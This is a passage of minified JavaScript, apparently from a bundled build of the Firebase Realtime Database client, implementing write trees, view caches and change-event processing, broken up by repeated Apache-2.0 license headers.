 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $d{constructor(e,n,r){this.path=e,this.affectedTree=n,this.revert=r,this.type=An.ACK_USER_WRITE,this.source=Jv()}operationForChild(e){if(ce(this.path)){if(this.affectedTree.value!=null)return B(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;{const n=this.affectedTree.subtree(new Se(e));return new $d(ve(),n,this.revert)}}else return B(ae(this.path)===e,"operationForChild called for unrelated child."),new $d(ke(this.path),this.affectedTree,this.revert)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ql{constructor(e,n){this.source=e,this.path=n,this.type=An.LISTEN_COMPLETE}operationForChild(e){return ce(this.path)?new ql(this.source,ve()):new ql(this.source,ke(this.path))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ns{constructor(e,n,r){this.source=e,this.path=n,this.snap=r,this.type=An.OVERWRITE}operationForChild(e){return ce(this.path)?new Ns(this.source,ve(),this.snap.getImmediateChild(e)):new Ns(this.source,ke(this.path),this.snap)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vo{constructor(e,n,r){this.source=e,this.path=n,this.children=r,this.type=An.MERGE}operationForChild(e){if(ce(this.path)){const n=this.children.subtree(new Se(e));return n.isEmpty()?null:n.value?new Ns(this.source,ve(),n.value):new Vo(this.source,ve(),n)}else return B(ae(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new Vo(this.source,ke(this.path),this.children)}toString(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ui{constructor(e,n,r){this.node_=e,this.fullyInitialized_=n,this.filtered_=r}isFullyInitialized(){return this.fullyInitialized_}isFiltered(){return this.filtered_}isCompleteForPath(e){if(ce(e))return this.isFullyInitialized()&&!this.filtered_;const n=ae(e);return this.isCompleteForChild(n)}isCompleteForChild(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)}getNode(){return this.node_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class J3{constructor(e){this.query_=e,this.index_=this.query_._queryParams.getIndex()}}function Z3(t,e,n,r){const i=[],s=[];return e.forEach(o=>{o.type==="child_changed"&&t.index_.indexedValueChanged(o.oldSnap,o.snapshotNode)&&s.push(V3(o.childName,o.snapshotNode))}),Wa(t,i,"child_removed",e,r,n),Wa(t,i,"child_added",e,r,n),Wa(t,i,"child_moved",s,r,n),Wa(t,i,"child_changed",e,r,n),Wa(t,i,"value",e,r,n),i}function Wa(t,e,n,r,i,s){const o=r.filter(a=>a.type===n);o.sort((a,c)=>t5(t,a,c)),o.forEach(a=>{const c=e5(t,a,s);i.forEach(u=>{u.respondsTo(a.type)&&e.push(u.createEvent(c,t.query_))})})}function e5(t,e,n){return e.type==="value"||e.type==="child_removed"||(e.prevName=n.getPredecessorChildName(e.childName,e.snapshotNode,t.index_)),e}function t5(t,e,n){if(e.childName==null||n.childName==null)throw na("Should only compare child_ events.");const r=new le(e.childName,e.snapshotNode),i=new le(n.childName,n.snapshotNode);return t.index_.compare(r,i)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Rh(t,e){return{eventCache:t,serverCache:e}}function fl(t,e,n,r){return Rh(new Ui(e,n,r),t.serverCache)}function wT(t,e,n,r){return Rh(t.eventCache,new Ui(e,n,r))}function zd(t){return t.eventCache.isFullyInitialized()?t.eventCache.getNode():null}function ks(t){return t.serverCache.isFullyInitialized()?t.serverCache.getNode():null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let hp;const n5=()=>(hp||(hp=new Vt($F)),hp);class Ne{static fromObject(e){let n=new Ne(null);return ht(e,(r,i)=>{n=n.set(new Se(r),i)}),n}constructor(e,n=n5()){this.value=e,this.children=n}isEmpty(){return this.value===null&&this.children.isEmpty()}findRootMostMatchingPathAndValue(e,n){if(this.value!=null&&n(this.value))return{path:ve(),value:this.value};if(ce(e))return null;{const r=ae(e),i=this.children.get(r);if(i!==null){const s=i.findRootMostMatchingPathAndValue(ke(e),n);return s!=null?{path:Ve(new Se(r),s.path),value:s.value}:null}else return null}}findRootMostValueAndPath(e){return this.findRootMostMatchingPathAndValue(e,()=>!0)}subtree(e){if(ce(e))return this;{const n=ae(e),r=this.children.get(n);return r!==null?r.subtree(ke(e)):new Ne(null)}}set(e,n){if(ce(e))return new Ne(n,this.children);{const r=ae(e),s=(this.children.get(r)||new Ne(null)).set(ke(e),n),o=this.children.insert(r,s);return new Ne(this.value,o)}}remove(e){if(ce(e))return this.children.isEmpty()?new Ne(null):new Ne(null,this.children);{const n=ae(e),r=this.children.get(n);if(r){const i=r.remove(ke(e));let s;return i.isEmpty()?s=this.children.remove(n):s=this.children.insert(n,i),this.value===null&&s.isEmpty()?new Ne(null):new Ne(this.value,s)}else return this}}get(e){if(ce(e))return this.value;{const n=ae(e),r=this.children.get(n);return r?r.get(ke(e)):null}}setTree(e,n){if(ce(e))return n;{const r=ae(e),s=(this.children.get(r)||new Ne(null)).setTree(ke(e),n);let o;return s.isEmpty()?o=this.children.remove(r):o=this.children.insert(r,s),new Ne(this.value,o)}}fold(e){return this.fold_(ve(),e)}fold_(e,n){const r={};return this.children.inorderTraversal((i,s)=>{r[i]=s.fold_(Ve(e,i),n)}),n(e,this.value,r)}findOnPath(e,n){return this.findOnPath_(e,ve(),n)}findOnPath_(e,n,r){const i=this.value?r(n,this.value):!1;if(i)return i;if(ce(e))return null;{const s=ae(e),o=this.children.get(s);return o?o.findOnPath_(ke(e),Ve(n,s),r):null}}foreachOnPath(e,n){return this.foreachOnPath_(e,ve(),n)}foreachOnPath_(e,n,r){if(ce(e))return this;{this.value&&r(n,this.value);const i=ae(e),s=this.children.get(i);return s?s.foreachOnPath_(ke(e),Ve(n,i),r):new Ne(null)}}foreach(e){this.foreach_(ve(),e)}foreach_(e,n){this.children.inorderTraversal((r,i)=>{i.foreach_(Ve(e,r),n)}),this.value&&n(e,this.value)}foreachChild(e){this.children.inorderTraversal((n,r)=>{r.value&&e(n,r.value)})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jn{constructor(e){this.writeTree_=e}static empty(){return new jn(new Ne(null))}}function pl(t,e,n){if(ce(e))return new jn(new Ne(n));{const r=t.writeTree_.findRootMostValueAndPath(e);if(r!=null){const i=r.path;let s=r.value;const o=Pt(i,e);return s=s.updateChild(o,n),new jn(t.writeTree_.set(i,s))}else{const i=new Ne(n),s=t.writeTree_.setTree(e,i);return new jn(s)}}}function Gm(t,e,n){let r=t;return ht(n,(i,s)=>{r=pl(r,Ve(e,i),s)}),r}function Nx(t,e){if(ce(e))return jn.empty();{const n=t.writeTree_.setTree(e,new Ne(null));return new jn(n)}}function qm(t,e){return Ls(t,e)!=null}function Ls(t,e){const n=t.writeTree_.findRootMostValueAndPath(e);return n!=null?t.writeTree_.get(n.path).getChild(Pt(n.path,e)):null}function kx(t){const e=[],n=t.writeTree_.value;return n!=null?n.isLeafNode()||n.forEachChild(He,(r,i)=>{e.push(new le(r,i))}):t.writeTree_.children.inorderTraversal((r,i)=>{i.value!=null&&e.push(new le(r,i.value))}),e}function Ii(t,e){if(ce(e))return t;{const n=Ls(t,e);return n!=null?new jn(new Ne(n)):new jn(t.writeTree_.subtree(e))}}function Ym(t){return t.writeTree_.isEmpty()}function Ho(t,e){return xT(ve(),t.writeTree_,e)}function xT(t,e,n){if(e.value!=null)return n.updateChild(t,e.value);{let r=null;return e.children.inorderTraversal((i,s)=>{i===".priority"?(B(s.value!==null,"Priority writes must always be leaf nodes"),r=s.value):n=xT(Ve(t,i),s,n)}),!n.getChild(t).isEmpty()&&r!==null&&(n=n.updateChild(Ve(t,".priority"),r)),n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ah(t,e){return bT(e,t)}function r5(t,e,n,r,i){B(r>t.lastWriteId,"Stacking an older write on top of newer ones"),i===void 0&&(i=!0),t.allWrites.push({path:e,snap:n,writeId:r,visible:i}),i&&(t.visibleWrites=pl(t.visibleWrites,e,n)),t.lastWriteId=r}function i5(t,e,n,r){B(r>t.lastWriteId,"Stacking an older merge on top of newer ones"),t.allWrites.push({path:e,children:n,writeId:r,visible:!0}),t.visibleWrites=Gm(t.visibleWrites,e,n),t.lastWriteId=r}function s5(t,e){for(let n=0;n<t.allWrites.length;n++){const r=t.allWrites[n];if(r.writeId===e)return r}return null}function o5(t,e){const n=t.allWrites.findIndex(a=>a.writeId===e);B(n>=0,"removeWrite called with nonexistent writeId.");const r=t.allWrites[n];t.allWrites.splice(n,1);let i=r.visible,s=!1,o=t.allWrites.length-1;for(;i&&o>=0;){const a=t.allWrites[o];a.visible&&(o>=n&&a5(a,r.path)?i=!1:fn(r.path,a.path)&&(s=!0)),o--}if(i){if(s)return l5(t),!0;if(r.snap)t.visibleWrites=Nx(t.visibleWrites,r.path);else{const a=r.children;ht(a,c=>{t.visibleWrites=Nx(t.visibleWrites,Ve(r.path,c))})}return!0}else return!1}function a5(t,e){if(t.snap)return fn(t.path,e);for(const n in t.children)if(t.children.hasOwnProperty(n)&&fn(Ve(t.path,n),e))return!0;return!1}function l5(t){t.visibleWrites=ET(t.allWrites,c5,ve()),t.allWrites.length>0?t.lastWriteId=t.allWrites[t.allWrites.length-1].writeId:t.lastWriteId=-1}function c5(t){return t.visible}function ET(t,e,n){let r=jn.empty();for(let i=0;i<t.length;++i){const s=t[i];if(e(s)){const o=s.path;let a;if(s.snap)fn(n,o)?(a=Pt(n,o),r=pl(r,a,s.snap)):fn(o,n)&&(a=Pt(o,n),r=pl(r,ve(),s.snap.getChild(a)));else if(s.children){if(fn(n,o))a=Pt(n,o),r=Gm(r,a,s.children);else if(fn(o,n))if(a=Pt(o,n),ce(a))r=Gm(r,ve(),s.children);else{const c=Uo(s.children,ae(a));if(c){const u=c.getChild(ke(a));r=pl(r,ve(),u)}}}else throw na("WriteRecord should have .snap or .children")}}return r}function CT(t,e,n,r,i){if(!r&&!i){const s=Ls(t.visibleWrites,e);if(s!=null)return s;{const o=Ii(t.visibleWrites,e);if(Ym(o))return n;if(n==null&&!qm(o,ve()))return null;{const a=n||te.EMPTY_NODE;return Ho(o,a)}}}else{const s=Ii(t.visibleWrites,e);if(!i&&Ym(s))return n;if(!i&&n==null&&!qm(s,ve()))return null;{const o=function(u){return(u.visible||i)&&(!r||!~r.indexOf(u.writeId))&&(fn(u.path,e)||fn(e,u.path))},a=ET(t.allWrites,o,e),c=n||te.EMPTY_NODE;return Ho(a,c)}}}function u5(t,e,n){let r=te.EMPTY_NODE;const i=Ls(t.visibleWrites,e);if(i)return i.isLeafNode()||i.forEachChild(He,(s,o)=>{r=r.updateImmediateChild(s,o)}),r;if(n){const s=Ii(t.visibleWrites,e);return n.forEachChild(He,(o,a)=>{const c=Ho(Ii(s,new Se(o)),a);r=r.updateImmediateChild(o,c)}),kx(s).forEach(o=>{r=r.updateImmediateChild(o.name,o.node)}),r}else{const s=Ii(t.visibleWrites,e);return kx(s).forEach(o=>{r=r.updateImmediateChild(o.name,o.node)}),r}}function d5(t,e,n,r,i){B(r||i,"Either existingEventSnap or existingServerSnap must exist");const s=Ve(e,n);if(qm(t.visibleWrites,s))return null;{const o=Ii(t.visibleWrites,s);return Ym(o)?i.getChild(n):Ho(o,i.getChild(n))}}function h5(t,e,n,r){const i=Ve(e,n),s=Ls(t.visibleWrites,i);if(s!=null)return s;if(r.isCompleteForChild(n)){const o=Ii(t.visibleWrites,i);return Ho(o,r.getNode().getImmediateChild(n))}else return null}function f5(t,e){return Ls(t.visibleWrites,e)}function p5(t,e,n,r,i,s,o){let a;const c=Ii(t.visibleWrites,e),u=Ls(c,ve());if(u!=null)a=u;else if(n!=null)a=Ho(c,n);else return[];if(a=a.withIndex(o),!a.isEmpty()&&!a.isLeafNode()){const p=[],f=o.getCompare(),h=s?a.getReverseIteratorFrom(r,o):a.getIteratorFrom(r,o);let E=h.getNext();for(;E&&p.length<i;)f(E,r)!==0&&p.push(E),E=h.getNext();return p}else return[]}function m5(){return{visibleWrites:jn.empty(),allWrites:[],lastWriteId:-1}}function Bd(t,e,n,r){return CT(t.writeTree,t.treePath,e,n,r)}function ty(t,e){return u5(t.writeTree,t.treePath,e)}function Px(t,e,n,r){return d5(t.writeTree,t.treePath,e,n,r)}function Vd(t,e){return f5(t.writeTree,Ve(t.treePath,e))}function g5(t,e,n,r,i,s){return p5(t.writeTree,t.treePath,e,n,r,i,s)}function ny(t,e,n){return h5(t.writeTree,t.treePath,e,n)}function ST(t,e){return bT(Ve(t.treePath,e),t.writeTree)}function bT(t,e){return{treePath:t,writeTree:e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class v5{constructor(){this.changeMap=new Map}trackChildChange(e){const n=e.type,r=e.childName;B(n==="child_added"||n==="child_changed"||n==="child_removed","Only child changes supported for tracking"),B(r!==".priority","Only non-priority child changes can be tracked.");const i=this.changeMap.get(r);if(i){const s=i.type;if(n==="child_added"&&s==="child_removed")this.changeMap.set(r,Kl(r,e.snapshotNode,i.snapshotNode));else if(n==="child_removed"&&s==="child_added")this.changeMap.delete(r);else if(n==="child_removed"&&s==="child_changed")this.changeMap.set(r,Wl(r,i.oldSnap));else if(n==="child_changed"&&s==="child_added")this.changeMap.set(r,Bo(r,e.snapshotNode));else if(n==="child_changed"&&s==="child_changed")this.changeMap.set(r,Kl(r,e.snapshotNode,i.oldSnap));else throw na("Illegal combination of changes: "+e+" occurred after "+i)}else this.changeMap.set(r,e)}getChanges(){return Array.from(this.changeMap.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class y5{getCompleteChild(e){return null}getChildAfterChild(e,n,r){return null}}const TT=new y5;class ry{constructor(e,n,r=null){this.writes_=e,this.viewCache_=n,this.optCompleteServerCache_=r}getCompleteChild(e){const n=this.viewCache_.eventCache;if(n.isCompleteForChild(e))return n.getNode().getImmediateChild(e);{const r=this.optCompleteServerCache_!=null?new Ui(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache;return ny(this.writes_,e,r)}}getChildAfterChild(e,n,r){const i=this.optCompleteServerCache_!=null?this.optCompleteServerCache_:ks(this.viewCache_),s=g5(this.writes_,i,n,1,r,e);return s.length===0?null:s[0]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _5(t){return{filter:t}}function w5(t,e){B(e.eventCache.getNode().isIndexed(t.filter.getIndex()),"Event snap not indexed"),B(e.serverCache.getNode().isIndexed(t.filter.getIndex()),"Server snap not indexed")}function x5(t,e,n,r,i){const s=new v5;let o,a;if(n.type===An.OVERWRITE){const u=n;u.source.fromUser?o=Qm(t,e,u.path,u.snap,r,i,s):(B(u.source.fromServer,"Unknown source."),a=u.source.tagged||e.serverCache.isFiltered()&&!ce(u.path),o=Hd(t,e,u.path,u.snap,r,i,a,s))}else if(n.type===An.MERGE){const u=n;u.source.fromUser?o=C5(t,e,u.path,u.children,r,i,s):(B(u.source.fromServer,"Unknown source."),a=u.source.tagged||e.serverCache.isFiltered(),o=Xm(t,e,u.path,u.children,r,i,a,s))}else if(n.type===An.ACK_USER_WRITE){const u=n;u.revert?o=T5(t,e,u.path,r,i,s):o=S5(t,e,u.path,u.affectedTree,r,i,s)}else if(n.type===An.LISTEN_COMPLETE)o=b5(t,e,n.path,r,s);else throw na("Unknown operation type: "+n.type);const c=s.getChanges();return E5(e,o,c),{viewCache:o,changes:c}}function E5(t,e,n){const r=e.eventCache;if(r.isFullyInitialized()){const i=r.getNode().isLeafNode()||r.getNode().isEmpty(),s=zd(t);(n.length>0||!t.eventCache.isFullyInitialized()||i&&!r.getNode().equals(s)||!r.getNode().getPriority().equals(s.getPriority()))&&n.push(yT(zd(e)))}}function IT(t,e,n,r,i,s){const o=e.eventCache;if(Vd(r,n)!=null)return e;{let a,c;if(ce(n))if(B(e.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),e.serverCache.isFiltered()){const u=ks(e),p=u instanceof te?u:te.EMPTY_NODE,f=ty(r,p);a=t.filter.updateFullNode(e.eventCache.getNode(),f,s)}else{const u=Bd(r,ks(e));a=t.filter.updateFullNode(e.eventCache.getNode(),u,s)}else{const u=ae(n);if(u===".priority"){B(Fi(n)===1,"Can't have a priority with additional path components");const p=o.getNode();c=e.serverCache.getNode();const f=Px(r,n,p,c);f!=null?a=t.filter.updatePriority(p,f):a=o.getNode()}else{const p=ke(n);let f;if(o.isCompleteForChild(u)){c=e.serverCache.getNode();const h=Px(r,n,o.getNode(),c);h!=null?f=o.getNode().getImmediateChild(u).updateChild(p,h):f=o.getNode().getImmediateChild(u)}else f=ny(r,u,e.serverCache);f!=null?a=t.filter.updateChild(o.getNode(),u,f,p,i,s):a=o.getNode()}}return fl(e,a,o.isFullyInitialized()||ce(n),t.filter.filtersNodes())}}function Hd(t,e,n,r,i,s,o,a){const c=e.serverCache;let u;const p=o?t.filter:t.filter.getIndexedFilter();if(ce(n))u=p.updateFullNode(c.getNode(),r,null);else if(p.filtersNodes()&&!c.isFiltered()){const E=c.getNode().updateChild(n,r);u=p.updateFullNode(c.getNode(),E,null)}else{const E=ae(n);if(!c.isCompleteForPath(n)&&Fi(n)>1)return e;const _=ke(n),C=c.getNode().getImmediateChild(E).updateChild(_,r);E===".priority"?u=p.updatePriority(c.getNode(),C):u=p.updateChild(c.getNode(),E,C,_,TT,null)}const f=wT(e,u,c.isFullyInitialized()||ce(n),p.filtersNodes()),h=new ry(i,f,s);return IT(t,f,n,i,h,a)}function Qm(t,e,n,r,i,s,o){const a=e.eventCache;let c,u;const p=new ry(i,e,s);if(ce(n))u=t.filter.updateFullNode(e.eventCache.getNode(),r,o),c=fl(e,u,!0,t.filter.filtersNodes());else{const f=ae(n);if(f===".priority")u=t.filter.updatePriority(e.eventCache.getNode(),r),c=fl(e,u,a.isFullyInitialized(),a.isFiltered());else{const h=ke(n),E=a.getNode().getImmediateChild(f);let _;if(ce(h))_=r;else{const y=p.getCompleteChild(f);y!=null?Kv(h)===".priority"&&y.getChild(dT(h)).isEmpty()?_=y:_=y.updateChild(h,r):_=te.EMPTY_NODE}if(E.equals(_))c=e;else{const y=t.filter.updateChild(a.getNode(),f,_,h,p,o);c=fl(e,y,a.isFullyInitialized(),t.filter.filtersNodes())}}}return c}function Rx(t,e){return t.eventCache.isCompleteForChild(e)}function C5(t,e,n,r,i,s,o){let a=e;return r.foreach((c,u)=>{const p=Ve(n,c);Rx(e,ae(p))&&(a=Qm(t,a,p,u,i,s,o))}),r.foreach((c,u)=>{const p=Ve(n,c);Rx(e,ae(p))||(a=Qm(t,a,p,u,i,s,o))}),a}function Ax(t,e,n){return n.foreach((r,i)=>{e=e.updateChild(r,i)}),e}function Xm(t,e,n,r,i,s,o,a){if(e.serverCache.getNode().isEmpty()&&!e.serverCache.isFullyInitialized())return e;let c=e,u;ce(n)?u=r:u=new Ne(null).setTree(n,r);const p=e.serverCache.getNode();return u.children.inorderTraversal((f,h)=>{if(p.hasChild(f)){const E=e.serverCache.getNode().getImmediateChild(f),_=Ax(t,E,h);c=Hd(t,c,new Se(f),_,i,s,o,a)}}),u.children.inorderTraversal((f,h)=>{const E=!e.serverCache.isCompleteForChild(f)&&h.value===null;if(!p.hasChild(f)&&!E){const _=e.serverCache.getNode().getImmediateChild(f),y=Ax(t,_,h);c=Hd(t,c,new Se(f),y,i,s,o,a)}}),c}function S5(t,e,n,r,i,s,o){if(Vd(i,n)!=null)return e;const a=e.serverCache.isFiltered(),c=e.serverCache;if(r.value!=null){if(ce(n)&&c.isFullyInitialized()||c.isCompleteForPath(n))return Hd(t,e,n,c.getNode().getChild(n),i,s,a,o);if(ce(n)){let u=new Ne(null);return c.getNode().forEachChild(_o,(p,f)=>{u=u.set(new Se(p),f)}),Xm(t,e,n,u,i,s,a,o)}else return e}else{let u=new Ne(null);return r.foreach((p,f)=>{const h=Ve(n,p);c.isCompleteForPath(h)&&(u=u.set(p,c.getNode().getChild(h)))}),Xm(t,e,n,u,i,s,a,o)}}function b5(t,e,n,r,i){const s=e.serverCache,o=wT(e,s.getNode(),s.isFullyInitialized()||ce(n),s.isFiltered());return IT(t,o,n,r,TT,i)}function T5(t,e,n,r,i,s){let o;if(Vd(r,n)!=null)return e;{const a=new ry(r,e,i),c=e.eventCache.getNode();let u;if(ce(n)||ae(n)===".priority"){let p;if(e.serverCache.isFullyInitialized())p=Bd(r,ks(e));else{const f=e.serverCache.getNode();B(f instanceof te,"serverChildren would be complete if leaf node"),p=ty(r,f)}p=p,u=t.filter.updateFullNode(c,p,s)}else{const p=ae(n);let f=ny(r,p,e.serverCache);f==null&&e.serverCache.isCompleteForChild(p)&&(f=c.getImmediateChild(p)),f!=null?u=t.filter.updateChild(c,p,f,ke(n),a,s):e.eventCache.getNode().hasChild(p)?u=t.filter.updateChild(c,p,te.EMPTY_NODE,ke(n),a,s):u=c,u.isEmpty()&&e.serverCache.isFullyInitialized()&&(o=Bd(r,ks(e)),o.isLeafNode()&&(u=t.filter.updateFullNode(u,o,s)))}return o=e.serverCache.isFullyInitialized()||Vd(r,ve())!=null,fl(e,u,o,t.filter.filtersNodes())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class I5{constructor(e,n){this.query_=e,this.eventRegistrations_=[];const r=this.query_._queryParams,i=new Qv(r.getIndex()),s=W3(r);this.processor_=_5(s);const o=n.serverCache,a=n.eventCache,c=i.updateFullNode(te.EMPTY_NODE,o.getNode(),null),u=s.updateFullNode(te.EMPTY_NODE,a.getNode(),null),p=new Ui(c,o.isFullyInitialized(),i.filtersNodes()),f=new Ui(u,a.isFullyInitialized(),s.filtersNodes());this.viewCache_=Rh(f,p),this.eventGenerator_=new J3(this.query_)}get query(){return this.query_}}function N5(t){return t.viewCache_.serverCache.getNode()}function k5(t){return zd(t.viewCache_)}function P5(t,e){const n=ks(t.viewCache_);return n&&(t.query._queryParams.loadsAllData()||!ce(e)&&!n.getImmediateChild(ae(e)).isEmpty())?n.getChild(e):null}function Ox(t){return t.eventRegistrations_.length===0}function R5(t,e){t.eventRegistrations_.push(e)}function Dx(t,e,n){const r=[];if(n){B(e==null,"A cancel should cancel all event registrations.");const i=t.query._path;t.eventRegistrations_.forEach(s=>{const o=s.createCancelEvent(n,i);o&&r.push(o)})}if(e){let i=[];for(let s=0;s<t.eventRegistrations_.length;++s){const o=t.eventRegistrations_[s];if(!o.matches(e))i.push(o);else if(e.hasAnyCallback()){i=i.concat(t.eventRegistrations_.slice(s+1));break}}t.eventRegistrations_=i}else t.eventRegistrations_=[];return r}function jx(t,e,n,r){e.type===An.MERGE&&e.source.queryId!==null&&(B(ks(t.viewCache_),"We should always have a full cache before handling merges"),B(zd(t.viewCache_),"Missing event cache, even though we have a server cache"));const i=t.viewCache_,s=x5(t.processor_,i,e,n,r);return w5(t.processor_,s.viewCache),B(s.viewCache.serverCache.isFullyInitialized()||!i.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),t.viewCache_=s.viewCache,NT(t,s.changes,s.viewCache.eventCache.getNode(),null)}function A5(t,e){const n=t.viewCache_.eventCache,r=[];return n.getNode().isLeafNode()||n.getNode().forEachChild(He,(s,o)=>{r.push(Bo(s,o))}),n.isFullyInitialized()&&r.push(yT(n.getNode())),NT(t,r,n.getNode(),e)}function NT(t,e,n,r){const i=r?[r]:t.eventRegistrations_;return Z3(t.eventGenerator_,e,n,i)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
